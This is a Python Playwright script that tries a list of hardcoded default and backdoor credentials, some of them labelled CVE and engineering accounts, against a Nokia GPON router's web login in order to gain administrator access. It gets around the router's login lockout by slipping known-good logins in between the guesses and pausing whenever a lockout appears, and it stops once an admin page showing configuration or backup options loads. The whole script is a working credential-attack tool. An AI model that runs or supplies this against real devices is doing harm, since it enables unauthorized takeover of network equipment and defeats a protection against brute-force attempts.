import asyncio
import os
from playwright.async_api import async_playwright
from dotenv import load_dotenv

load_dotenv()

GOOD_USER = os.getenv("ROUTER_USER")
GOOD_PASS = os.getenv("ROUTER_PASS")

# Newly discovered CVE / Engineering backdoors
CVE_BACKDOORS = [
    ("ONTUSER", "SUGAR2A041"),
    ("ONTUSER", "admin"),
    ("CRAFTSPERSON", "ALC#FGU"),
    ("CRAFTSPERSON", "ALC_FGU"),
    ("userAdminGPON", "ALC#FGU"),
    ("root", "huigu309"),
    ("root", "admin"),
]

# Interleave: 2 backdoors, then 1 good login to reset lockout
test_sequence = []
for i in range(0, len(CVE_BACKDOORS), 2):
    test_sequence.extend(CVE_BACKDOORS[i:i+2])
    test_sequence.append((GOOD_USER, GOOD_PASS, True)) 

if len(CVE_BACKDOORS) % 2 != 0:
    test_sequence.append(CVE_BACKDOORS[-1])
    test_sequence.append((GOOD_USER, GOOD_PASS, True))

async def attempt_login(context, user, pwd, is_good=False):
    page = await context.new_page()
    try:
        await page.goto(os.getenv("ROUTER_IP"), timeout=15000)
        inputs = await page.locator("input").all()
        for inp in inputs:
            if not await inp.is_visible(): continue
            itype = await inp.get_attribute("type")
            if itype == 'text': await inp.fill(user)
            elif itype == 'password': await inp.fill(pwd)
        
        buttons = page.locator("button, input[type='button'], input[type='submit'], a")
        for i in range(await buttons.count()):
            btn = buttons.nth(i)
            if await btn.is_visible():
                text = (await btn.text_content() or await btn.get_attribute("value") or "").lower()
                if "log" in text or "sign" in text or "submit" in text:
                    await btn.click()
                    break
                    
        await asyncio.sleep(4)
        url = page.url
        content = await page.content()
        
        if "error happen over 4 times" in content.lower() or "retry later" in content.lower():
            print(f"[!] LOCKOUT DETECTED! Waiting 60 seconds...")
            await asyncio.sleep(60)
            return False

        if is_good:
            if "login" in url.lower() or "password" in content.lower()[:1000] or "invalid" in content.lower():
                print(f"[-] WARNING: Known good credentials failed! Ensure .env is correct.")
                return False
            else:
                print(f"[+] Lockout reset successful.")
                return True
        
        # Check backdoor success
        if "login" in url.lower() or "password" in content.lower()[:1000] or "invalid" in content.lower() or "failed" in content.lower():
            print(f"[-] Failed: {user} / {pwd}")
            return False
        else:
            print(f"[!] SUCCESS: {user} / {pwd} -> Landed on: {url}")
            if "backup" in content.lower() or "configuration" in content.lower() or "romfile" in content.lower() or "super" in content.lower() or "management" in content.lower():
                print(f"    -> BINGO! God-Mode keywords visible!")
                return "BINGO"
            return True
            
    except Exception as e:
        print(f"[-] Error testing {user}/{pwd}: {e}")
        return False
    finally:
        await page.close()

async def main():
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        context = await browser.new_context(ignore_https_errors=True)
        
        print(f"[*] Testing Nokia CVE / Engineering backdoors...")
        
        for creds in test_sequence:
            if len(creds) == 3:
                user, pwd, is_good = creds
            else:
                user, pwd = creds
                is_good = False
                
            result = await attempt_login(context, user, pwd, is_good)
            if result == "BINGO":
                print("[*] God-Mode account found! Stopping script.")
                break
                
        await browser.close()
        print("[*] Done testing.")

if __name__ == "__main__":
    asyncio.run(main())
